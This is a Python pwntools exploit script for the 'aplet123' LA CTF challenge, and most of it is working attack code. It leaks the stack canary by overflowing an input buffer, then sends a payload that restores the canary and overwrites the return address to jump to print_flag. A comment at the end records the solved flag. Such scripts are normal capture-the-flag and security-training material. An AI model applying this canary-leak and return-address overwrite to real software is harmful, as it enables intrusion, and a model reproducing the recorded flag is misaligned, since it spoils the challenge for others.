#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./aplet123")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chall.lac.tf", 31123)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b"hello", b"A"*69+b"i'm")
	r.recvuntil(b'hi ')
	canary = r.recv(7)

	payload = flat({
		72: b"\x00" + canary,
		88: exe.sym['print_flag']
	})
	r.sendline(payload)
	r.sendline(b'bye')


	r.interactive()


if __name__ == "__main__":
	main()

# lactf{so_untrue_ei2p1wfwh9np2gg6}
